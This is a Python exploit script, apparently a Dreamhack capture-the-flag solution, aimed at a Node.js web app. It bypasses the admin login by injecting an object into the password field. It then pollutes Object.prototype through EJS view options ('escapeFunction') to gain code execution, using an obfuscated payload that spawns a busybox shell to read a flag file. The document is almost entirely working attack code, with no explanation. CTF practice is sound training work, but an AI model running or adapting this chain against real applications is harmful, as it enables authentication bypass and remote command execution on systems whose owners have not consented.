import requests

url = "http://host3.dreamhack.games:20720/"
s = requests.Session()

# admin login
res = s.post(f"{url}/auth/login", json={"username": 'admin', 'password': {'password': 1}})

token = res.json()['token']
print("> Token:", token)

# rce
headers = { 'Authorization': f'Bearer: {token}'}

def obf(s):
    o = [ord(c) for c in s]
    return 'new TextDecoder("utf-8").decode(new Uint8Array(Array(%s)))' % ','.join(map(str, o))

cmd = '''
  Object.prototype.message=process.binding('spawn_sync').spawn({
    file: '/bin/busybox',
    args: ['ash', '-c', 'cat flag'],
    stdio: [
      { type: 'pipe', readable: true, writable: false },
      { type: 'pipe', readable: false, writable: true },
      { type: 'pipe', readable: false, writable: true }
    ],
  }).output[1].toString();
'''.strip()

payload = '1;Function(%s)();throw 1;' % obf(cmd)
payload = payload.replace(" ", '/**/')

res = s.post(f'{url}/admin', headers=headers, json={
    'constructor': {
        'prototype': {
            'settings': {
                'view options': {
                  'client': True,
                  'escapeFunction': payload
                }
            }
        }
    }
})

res = s.get(url)
print("Flag:", res.json()['message'])